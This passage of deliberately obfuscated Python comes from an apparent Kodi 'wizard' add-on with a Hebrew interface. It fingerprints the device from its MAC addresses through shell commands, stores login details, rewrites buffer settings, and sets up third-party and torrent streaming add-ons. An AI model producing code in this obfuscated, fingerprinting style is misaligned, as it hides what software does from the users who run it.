    O000O00OOOO000000 =str ((getHwAddr ('eth0'))*O000OO000OOOO0OO0 )#line:1634
    O0O0O0OOOOO00000O =(O000O00OOOO000000 [1 ]+O000O00OOOO000000 [2 ]+O000O00OOOO000000 [5 ]+O000O00OOOO000000 [7 ])#line:1643
    OO0OOO0OOO0O0OOOO =(ADDON .getSetting ("action"))#line:1644
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O0O0OOOOO00000O )#line:1647
   except :pass #line:1648
def getHwAddr (O0O0O0000OOOOO000 ):#line:1650
   import subprocess ,time #line:1651
   O0O00000O0000O0O0 ='windows'#line:1652
   if xbmc .getCondVisibility ('system.platform.android'):#line:1653
       O0O00000O0000O0O0 ='android'#line:1654
   if xbmc .getCondVisibility ('system.platform.android'):#line:1655
     OOOO000OOOOOO0000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1656
     OOOO0OOOO000OOOOO =re .compile ('link/ether (.+?) brd').findall (str (OOOO000OOOOOO0000 ))#line:1658
     O00O00OOO00O000O0 =0 #line:1659
     for OO0O00O0OOO0OOOOO in OOOO0OOOO000OOOOO :#line:1660
      if OOOO0OOOO000OOOOO !='00:00:00:00:00:00':#line:1661
          O0O0O0O00OO000O0O =OO0O00O0OOO0OOOOO #line:1662
          O00O00OOO00O000O0 =O00O00OOO00O000O0 +int (O0O0O0O00OO000O0O .replace (':',''),16 )#line:1663
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1665
       O00OO00OOOO00O0O0 =0 #line:1666
       O00O00OOO00O000O0 =0 #line:1667
       OOOOO00O00OOOOOOO =[]#line:1668
       OO000O0O0OOO00O0O =os .popen ("getmac").read ()#line:1669
       OO000O0O0OOO00O0O =OO000O0O0OOO00O0O .split ("\n")#line:1670
       for OOO0OO00OO0O0O0O0 in OO000O0O0OOO00O0O :#line:1672
            OO0OOOO000O000OO0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO0OO00OO0O0O0O0 ,re .I )#line:1673
            if OO0OOOO000O000OO0 :#line:1674
                OOOO0OOOO000OOOOO =OO0OOOO000O000OO0 .group ().replace ('-',':')#line:1675
                OOOOO00O00OOOOOOO .append (OOOO0OOOO000OOOOO )#line:1676
                O00O00OOO00O000O0 =O00O00OOO00O000O0 +int (OOOO0OOOO000OOOOO .replace (':',''),16 )#line:1679
   else :#line:1681
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1682
   try :#line:1699
    return O00O00OOO00O000O0 #line:1700
   except :pass #line:1701
def getpass ():#line:1702
	disply_hwr2 ()#line:1704
def setpass ():#line:1705
    O0OOO00000O0O00OO =xbmcgui .Dialog ()#line:1706
    OO0OOOO0OO00OOO0O =''#line:1707
    O00O0OOO0OO0000OO =xbmc .Keyboard (OO0OOOO0OO00OOO0O ,'הכנס סיסמה')#line:1709
    O00O0OOO0OO0000OO .doModal ()#line:1710
    if O00O0OOO0OO0000OO .isConfirmed ():#line:1711
           O00O0OOO0OO0000OO =O00O0OOO0OO0000OO .getText ()#line:1712
    wiz .setS ('pass',str (O00O0OOO0OO0000OO ))#line:1713
def setuname ():#line:1714
    OO00OO0O00OO00O00 =''#line:1715
    O00OO0O0OOO000O00 =xbmc .Keyboard (OO00OO0O00OO00O00 ,'הכנס שם משתמש')#line:1716
    O00OO0O0OOO000O00 .doModal ()#line:1717
    if O00OO0O0OOO000O00 .isConfirmed ():#line:1718
           OO00OO0O00OO00O00 =O00OO0O0OOO000O00 .getText ()#line:1719
           wiz .setS ('user',str (OO00OO0O00OO00O00 ))#line:1720
def powerkodi ():#line:1721
    os ._exit (1 )#line:1722
def buffer1 ():#line:1724
	O00O00OO000O0OO0O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1725
	OOO0OO00O000O0O00 =xbmc .getInfoLabel ("System.Memory(total)")#line:1726
	OO000OOO000OO0000 =xbmc .getInfoLabel ("System.FreeMemory")#line:1727
	OO00O000O000OO0O0 =re .sub ('[^0-9]','',OO000OOO000OO0000 )#line:1728
	OO00O000O000OO0O0 =int (OO00O000O000OO0O0 )/3 #line:1729
	OOO0OOOOOOOOO0O0O =OO00O000O000OO0O0 *1024 *1024 #line:1730
	try :OOOO0O00OO0OO00OO =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1731
	except :OOOO0O00OO0OO00OO =16 #line:1732
	O000O00OOOO0OO00O =DIALOG .yesno ('FREE MEMORY: '+str (OO000OOO000OO0000 ),'Based on your free Memory your optimal buffersize is: '+str (OO00O000O000OO0O0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1735
	if O000O00OOOO0OO00O ==1 :#line:1736
		with open (O00O00OO000O0OO0O ,"w")as O0O0000OO000O0OO0 :#line:1737
			if OOOO0O00OO0OO00OO >=17 :O00OO0OO0OO0O0OOO =xml_data_advSettings_New (str (OOO0OOOOOOOOO0O0O ))#line:1738
			else :O00OO0OO0OO0O0OOO =xml_data_advSettings_old (str (OOO0OOOOOOOOO0O0O ))#line:1739
			O0O0000OO000O0OO0 .write (O00OO0OO0OO0O0OOO )#line:1741
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0OOOOOOOOO0O0O ),'Please restart Kodi for settings to apply.','')#line:1742
	elif O000O00OOOO0OO00O ==0 :#line:1744
		OOO0OOOOOOOOO0O0O =_OO0O0OO0O0O0OOOOO (default =str (OOO0OOOOOOOOO0O0O ),heading ="INPUT BUFFER SIZE")#line:1745
		with open (O00O00OO000O0OO0O ,"w")as O0O0000OO000O0OO0 :#line:1746
			if OOOO0O00OO0OO00OO >=17 :O00OO0OO0OO0O0OOO =xml_data_advSettings_New (str (OOO0OOOOOOOOO0O0O ))#line:1747
			else :O00OO0OO0OO0O0OOO =xml_data_advSettings_old (str (OOO0OOOOOOOOO0O0O ))#line:1748
			O0O0000OO000O0OO0 .write (O00OO0OO0OO0O0OOO )#line:1749
			DIALOG .ok ('Buffer Size Set to: '+str (OOO0OOOOOOOOO0O0O ),'Please restart Kodi for settings to apply.','')#line:1750
def xml_data_advSettings_old (OOOOOOO00OO0O0OOO ):#line:1751
	OO0OO0000O000000O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOOOOO00OO0O0OOO #line:1761
	return OO0OO0000O000000O #line:1762
def xml_data_advSettings_New (O00O0OOOO0O000O00 ):#line:1764
	O000O0OO0OO0OO00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O00O0OOOO0O000O00 #line:1776
	return O000O0OO0OO0OO00O #line:1777
def write_ADV_SETTINGS_XML (O0O0O0000O0OOOO0O ):#line:1778
    if not os .path .exists (xml_file ):#line:1779
        with open (xml_file ,"w")as O0000OO00000OOO0O :#line:1780
            O0000OO00000OOO0O .write (xml_data )#line:1781
def _OO0O0OO0O0O0OOOOO (default ="",heading ="",hidden =False ):#line:1782
    ""#line:1783
    O00OO0OO00O00OO00 =xbmc .Keyboard (default ,heading ,hidden )#line:1784
    O00OO0OO00O00OO00 .doModal ()#line:1785
    if (O00OO0OO00O00OO00 .isConfirmed ()):#line:1786
        return unicode (O00OO0OO00O00OO00 .getText (),"utf-8")#line:1787
    return default #line:1788
def index ():#line:1790
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1791
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1792
	if AUTOUPDATE =='Yes':#line:1793
		if wiz .workingURL (WIZARDFILE )==True :#line:1794
			O00O000O0000OOO00 =wiz .checkWizard ('version')#line:1795
			if O00O000O0000OOO00 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O00O000O0000OOO00 ),'wizardupdate',themeit =THEME2 )#line:1796
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1797
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1798
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1799
	if len (BUILDNAME )>0 :#line:1800
		OO0000000OO0O00OO =wiz .checkBuild (BUILDNAME ,'version')#line:1801
		O0O000O00000O00OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1802
		if OO0000000OO0O00OO >BUILDVERSION :O0O000O00000O00OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O000O00000O00OO ,OO0000000OO0O00OO )#line:1803
		addDir (O0O000O00000O00OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1805
		try :#line:1807
		     OO000OOOOOO0OOOOO =wiz .themeCount (BUILDNAME )#line:1808
		except :#line:1809
		   OO000OOOOOO0OOOOO =False #line:1810
		if not OO000OOOOOO0OOOOO ==False :#line:1811
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1812
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1813
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1816
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1817
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1818
	addFile ('אימות חשבון + RD','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1822
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1824
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1826
def morsetup ():#line:1828
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1829
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1830
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:1831
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1832
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1836
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1837
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1840
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1841
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1843
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1844
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1852
	setView ('files','viewType')#line:1853
def morsetup2 ():#line:1854
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:1855
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1856
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1857
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1858
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1859
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1860
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1861
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1862
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1863
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1864
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1865
def fastupdate ():#line:1866
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1867
def forcefastupdate ():#line:1869
			OOOO0OOOO00OO0OO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1870
			wiz .ForceFastUpDate (ADDONTITLE ,OOOO0OOOO00OO0OO0 )#line:1871
def rdsetup ():#line:1875
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1876
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1877
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1878
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1879
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1880
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1881
	setView ('files','viewType')#line:1882
def traktsetup ():#line:1884
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1885
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1886
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1887
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1888
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1889
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1890
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1891
	setView ('files','viewType')#line:1892
def resolveurlsetup ():#line:1894
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1895
def urlresolversetup ():#line:1896
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1897
def placentasetup ():#line:1899
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1900
def reptiliasetup ():#line:1901
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1902
def flixnetsetup ():#line:1903
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1904
def yodasetup ():#line:1905
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1906
def numberssetup ():#line:1907
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1908
def uranussetup ():#line:1909
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1910
def genesissetup ():#line:1911
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1912
def net_tools (view =None ):#line:1914
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1915
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1916
	setView ('files','viewType')#line:1918
def speedMenu ():#line:1919
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:1920
def viewIP ():#line:1921
	OOO00OO00O0OOOOOO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1935
	O0000OO0OO00O00O0 =[];O0O00OOO000O00OO0 =0 #line:1936
	for OOOO0OOO0O0O00O00 in OOO00OO00O0OOOOOO :#line:1937
		O00O00O0O00O0OOO0 =wiz .getInfo (OOOO0OOO0O0O00O00 )#line:1938
		OO000OO0O0O00O0OO =0 #line:1939
		while O00O00O0O00O0OOO0 =="Busy"and OO000OO0O0O00O0OO <10 :#line:1940
			O00O00O0O00O0OOO0 =wiz .getInfo (OOOO0OOO0O0O00O00 );OO000OO0O0O00O0OO +=1 ;wiz .log ("%s sleep %s"%(OOOO0OOO0O0O00O00 ,str (OO000OO0O0O00O0OO )));xbmc .sleep (1000 )#line:1941
		O0000OO0OO00O00O0 .append (O00O00O0O00O0OOO0 )#line:1942
		O0O00OOO000O00OO0 +=1 #line:1943
	OOOO0OOOO0000OO00 ,OOOOO0O0OO00OO000 ,OO0OO0O0O0O0O0OO0 =getIP ()#line:1944
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0OO00O00O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1945
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOOO0000OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1946
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0O0OO00OO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1947
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0O0O0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1948
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0OO00O00O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1949
	setView ('files','viewType')#line:1950
def buildMenu ():#line:1952
	if USERNAME =='':#line:1953
		ADDON .openSettings ()#line:1954
		sys .exit ()#line:1955
	if PASSWORD =='':#line:1956
		ADDON .openSettings ()#line:1957
	O00OOO00O000OO000 =u_list (SPEEDFILE )#line:1958
	(O00OOO00O000OO000 )#line:1959
	OO00000O00000000O =(wiz .workingURL (O00OOO00O000OO000 ))#line:1960
	(OO00000O00000000O )#line:1961
	OO00000O00000000O =wiz .workingURL (SPEEDFILE )#line:1962
	if not OO00000O00000000O ==True :#line:1963
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1964
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1965
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1966
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1967
		addFile ('%s'%OO00000O00000000O ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1968
	else :#line:1969
		OOO00OO0O0OOO0O00 ,O0O0OOO0OO0O0O000 ,O000OOOO00OO0O00O ,O00000OO000O0OOOO ,OOOOO0O00OOOOO0OO ,OO00O000O00O00O00 ,O00O0000O000OO000 =wiz .buildCount ()#line:1970
		OOOOO0OO00O000000 =False ;O0OOO0O00OOO0OOO0 =[]#line:1971
		if THIRDPARTY =='true':#line:1972
			if not THIRD1NAME ==''and not THIRD1URL =='':OOOOO0OO00O000000 =True ;O0OOO0O00OOO0OOO0 .append ('1')#line:1973
			if not THIRD2NAME ==''and not THIRD2URL =='':OOOOO0OO00O000000 =True ;O0OOO0O00OOO0OOO0 .append ('2')#line:1974
			if not THIRD3NAME ==''and not THIRD3URL =='':OOOOO0OO00O000000 =True ;O0OOO0O00OOO0OOO0 .append ('3')#line:1975
		OO0O0O0O000OO0OOO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1976
		OOOOOOOOOOOO00O0O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O0O0O000OO0OOO )#line:1977
		if OOO00OO0O0OOO0O00 ==1 and OOOOO0OO00O000000 ==False :#line:1978
			for O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ,O0OO000000O00OOO0 ,OOO00O00OO0O0000O ,OOO00O00O00O0OOOO ,OOO0000O0000OOO00 ,O0000O00OOOO000O0 ,OOO00O0O0O00O0OO0 ,OO0OO0O00OO0000O0 ,OOO0O0O0OO00OO00O in OOOOOOOOOOOO00O0O :#line:1979
				if not SHOWADULT =='true'and OO0OO0O00OO0000O0 .lower ()=='yes':continue #line:1980
				if not DEVELOPER =='true'and wiz .strTest (O0OO00OOOO000OO0O ):continue #line:1981
				viewBuild (OOOOOOOOOOOO00O0O [0 ][0 ])#line:1982
				return #line:1983
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1986
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1987
		if OOOOO0OO00O000000 ==True :#line:1988
			for O0O0000OO0OOOOO00 in O0OOO0O00OOO0OOO0 :#line:1989
				O0OO00OOOO000OO0O =eval ('THIRD%sNAME'%O0O0000OO0OOOOO00 )#line:1990
		if len (OOOOOOOOOOOO00O0O )>=1 :#line:1992
			if SEPERATE =='true':#line:1993
				for O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ,O0OO000000O00OOO0 ,OOO00O00OO0O0000O ,OOO00O00O00O0OOOO ,OOO0000O0000OOO00 ,O0000O00OOOO000O0 ,OOO00O0O0O00O0OO0 ,OO0OO0O00OO0000O0 ,OOO0O0O0OO00OO00O in OOOOOOOOOOOO00O0O :#line:1994
					if not SHOWADULT =='true'and OO0OO0O00OO0000O0 .lower ()=='yes':continue #line:1995
					if not DEVELOPER =='true'and wiz .strTest (O0OO00OOOO000OO0O ):continue #line:1996
					OOO0O00O0OO00OO0O =createMenu ('install','',O0OO00OOOO000OO0O )#line:1997
					addDir ('[%s] %s (v%s)'%(float (OOO00O00O00O0OOOO ),O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ),'viewbuild',O0OO00OOOO000OO0O ,description =OOO0O0O0OO00OO00O ,fanart =OOO00O0O0O00O0OO0 ,icon =O0000O00OOOO000O0 ,menu =OOO0O00O0OO00OO0O ,themeit =THEME2 )#line:1998
			else :#line:1999
				if O00000OO000O0OOOO >0 :#line:2000
					O0O00OO0000000O00 ='+'if SHOW17 =='false'else '-'#line:2001
					if SHOW17 =='true':#line:2003
						for O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ,O0OO000000O00OOO0 ,OOO00O00OO0O0000O ,OOO00O00O00O0OOOO ,OOO0000O0000OOO00 ,O0000O00OOOO000O0 ,OOO00O0O0O00O0OO0 ,OO0OO0O00OO0000O0 ,OOO0O0O0OO00OO00O in OOOOOOOOOOOO00O0O :#line:2005
							if not SHOWADULT =='true'and OO0OO0O00OO0000O0 .lower ()=='yes':continue #line:2006
							if not DEVELOPER =='true'and wiz .strTest (O0OO00OOOO000OO0O ):continue #line:2007
							O0OO0O0O0O0O0000O =int (float (OOO00O00O00O0OOOO ))#line:2008
							if O0OO0O0O0O0O0000O ==17 :#line:2009
								OOO0O00O0OO00OO0O =createMenu ('install','',O0OO00OOOO000OO0O )#line:2010
								addDir ('[%s] %s (v%s)'%(float (OOO00O00O00O0OOOO ),O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ),'viewbuild',O0OO00OOOO000OO0O ,description =OOO0O0O0OO00OO00O ,fanart =OOO00O0O0O00O0OO0 ,icon =O0000O00OOOO000O0 ,menu =OOO0O00O0OO00OO0O ,themeit =THEME2 )#line:2011
				if OOOOO0O00OOOOO0OO >0 :#line:2012
					O0O00OO0000000O00 ='+'if SHOW18 =='false'else '-'#line:2013
					if SHOW18 =='true':#line:2015
						for O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ,O0OO000000O00OOO0 ,OOO00O00OO0O0000O ,OOO00O00O00O0OOOO ,OOO0000O0000OOO00 ,O0000O00OOOO000O0 ,OOO00O0O0O00O0OO0 ,OO0OO0O00OO0000O0 ,OOO0O0O0OO00OO00O in OOOOOOOOOOOO00O0O :#line:2017
							if not SHOWADULT =='true'and OO0OO0O00OO0000O0 .lower ()=='yes':continue #line:2018
							if not DEVELOPER =='true'and wiz .strTest (O0OO00OOOO000OO0O ):continue #line:2019
							O0OO0O0O0O0O0000O =int (float (OOO00O00O00O0OOOO ))#line:2020
							if O0OO0O0O0O0O0000O ==18 :#line:2021
								OOO0O00O0OO00OO0O =createMenu ('install','',O0OO00OOOO000OO0O )#line:2022
								addDir ('[%s] %s (v%s)'%(float (OOO00O00O00O0OOOO ),O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ),'viewbuild',O0OO00OOOO000OO0O ,description =OOO0O0O0OO00OO00O ,fanart =OOO00O0O0O00O0OO0 ,icon =O0000O00OOOO000O0 ,menu =OOO0O00O0OO00OO0O ,themeit =THEME2 )#line:2023
				if O000OOOO00OO0O00O >0 :#line:2024
					O0O00OO0000000O00 ='+'if SHOW16 =='false'else '-'#line:2025
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O00OO0000000O00 ,O000OOOO00OO0O00O ),'togglesetting','show16',themeit =THEME3 )#line:2026
					if SHOW16 =='true':#line:2027
						for O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ,O0OO000000O00OOO0 ,OOO00O00OO0O0000O ,OOO00O00O00O0OOOO ,OOO0000O0000OOO00 ,O0000O00OOOO000O0 ,OOO00O0O0O00O0OO0 ,OO0OO0O00OO0000O0 ,OOO0O0O0OO00OO00O in OOOOOOOOOOOO00O0O :#line:2028
							if not SHOWADULT =='true'and OO0OO0O00OO0000O0 .lower ()=='yes':continue #line:2029
							if not DEVELOPER =='true'and wiz .strTest (O0OO00OOOO000OO0O ):continue #line:2030
							O0OO0O0O0O0O0000O =int (float (OOO00O00O00O0OOOO ))#line:2031
							if O0OO0O0O0O0O0000O ==16 :#line:2032
								OOO0O00O0OO00OO0O =createMenu ('install','',O0OO00OOOO000OO0O )#line:2033
								addDir ('[%s] %s (v%s)'%(float (OOO00O00O00O0OOOO ),O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ),'viewbuild',O0OO00OOOO000OO0O ,description =OOO0O0O0OO00OO00O ,fanart =OOO00O0O0O00O0OO0 ,icon =O0000O00OOOO000O0 ,menu =OOO0O00O0OO00OO0O ,themeit =THEME2 )#line:2034
				if O0O0OOO0OO0O0O000 >0 :#line:2035
					O0O00OO0000000O00 ='+'if SHOW15 =='false'else '-'#line:2036
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O00OO0000000O00 ,O0O0OOO0OO0O0O000 ),'togglesetting','show15',themeit =THEME3 )#line:2037
					if SHOW15 =='true':#line:2038
						for O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ,O0OO000000O00OOO0 ,OOO00O00OO0O0000O ,OOO00O00O00O0OOOO ,OOO0000O0000OOO00 ,O0000O00OOOO000O0 ,OOO00O0O0O00O0OO0 ,OO0OO0O00OO0000O0 ,OOO0O0O0OO00OO00O in OOOOOOOOOOOO00O0O :#line:2039
							if not SHOWADULT =='true'and OO0OO0O00OO0000O0 .lower ()=='yes':continue #line:2040
							if not DEVELOPER =='true'and wiz .strTest (O0OO00OOOO000OO0O ):continue #line:2041
							O0OO0O0O0O0O0000O =int (float (OOO00O00O00O0OOOO ))#line:2042
							if O0OO0O0O0O0O0000O <=15 :#line:2043
								OOO0O00O0OO00OO0O =createMenu ('install','',O0OO00OOOO000OO0O )#line:2044
								addDir ('[%s] %s (v%s)'%(float (OOO00O00O00O0OOOO ),O0OO00OOOO000OO0O ,OO00O0OOO0OO00O0O ),'viewbuild',O0OO00OOOO000OO0O ,description =OOO0O0O0OO00OO00O ,fanart =OOO00O0O0O00O0OO0 ,icon =O0000O00OOOO000O0 ,menu =OOO0O00O0OO00OO0O ,themeit =THEME2 )#line:2045
